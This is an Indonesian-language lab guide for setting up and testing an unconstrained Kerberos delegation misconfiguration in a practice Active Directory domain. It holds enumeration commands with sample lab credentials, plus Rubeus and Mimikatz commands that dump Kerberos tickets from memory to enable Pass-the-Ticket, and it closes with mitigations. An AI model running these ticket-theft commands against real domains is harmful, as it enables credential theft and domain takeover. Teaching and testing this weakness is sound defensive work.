# 🔑 Misconfiguration: Unconstrained Delegation

## Apa itu Kerberos Delegation?

Delegation memungkinkan service account untuk bertindak **atas nama user lain** saat mengakses resource. Contoh: user login ke web server, lalu web server perlu mengakses database atas nama user tersebut.

Ada tiga tipe delegation:
1. **Unconstrained Delegation** — service bisa bertindak atas nama user ke **resource apa pun** (sangat berbahaya)
2. **Constrained Delegation** — service hanya bisa bertindak atas nama user ke resource tertentu
3. **Resource-Based Constrained Delegation (RBCD)** — dikonfigurasi di sisi resource tujuan

---

## Konfigurasi Unconstrained Delegation

**MITRE ATT&CK:** T1558 — Steal or Forge Kerberos Tickets

Jalankan di **DC1**:

```powershell
# Aktifkan unconstrained delegation pada FILESRV
Set-ADComputer -Identity "FILESRV" -TrustedForDelegation $true
```

### Apa yang Terjadi Secara Teknis

Ketika unconstrained delegation aktif di FILESRV:
1. User mengautentikasi ke FILESRV
2. KDC menyertakan **TGT (Ticket Granting Ticket)** user di dalam service ticket
3. TGT user disimpan di **memori FILESRV**
4. FILESRV bisa menggunakan TGT tersebut untuk mengakses resource lain sebagai user itu

### Mengapa Ini Sangat Berbahaya

Jika attacker mengompromikan FILESRV, mereka bisa:
1. Mengekstrak semua TGT dari memori (menggunakan Mimikatz/Rubeus)
2. Jika Domain Admin pernah mengakses FILESRV, TGT mereka ada di memori
3. Attacker bisa menggunakan TGT tersebut untuk Pass-the-Ticket dan menjadi Domain Admin

---

## Cara Menguji

### Dari Kali (enumerasi)

```bash
# Cari mesin dengan unconstrained delegation
# Menggunakan ldapsearch
ldapsearch -x -H ldap://192.168.56.10 -D "j.doe@corp.local" -w "Welcome2024!" \
    -b "DC=corp,DC=local" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
    cn distinguishedName

# Menggunakan Impacket
impacket-findDelegation corp.local/j.doe:Welcome2024! -dc-ip 192.168.56.10
```

### Dari Target Windows (jika sudah punya akses ke FILESRV)

```powershell
# Menggunakan Rubeus — monitor TGT yang masuk
.\Rubeus.exe monitor /interval:5

# Atau dump semua ticket dari memori
.\Rubeus.exe dump

# Menggunakan Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
```

---

## Verifikasi Konfigurasi

```powershell
# Di DC1 — cek computer dengan unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | `
    Select-Object Name, TrustedForDelegation

# Output yang diharapkan: FILESRV dan DC (DC selalu punya delegation)
```

---

## Mitigasi di Dunia Nyata

- Hindari unconstrained delegation — gunakan constrained delegation atau RBCD
- Tambahkan akun sensitif ke group **Protected Users** (mencegah TGT delegation)
- Set flag **Account is sensitive and cannot be delegated** pada akun high-value
- Monitor Event ID 4624 (logon type 10) di mesin dengan delegation
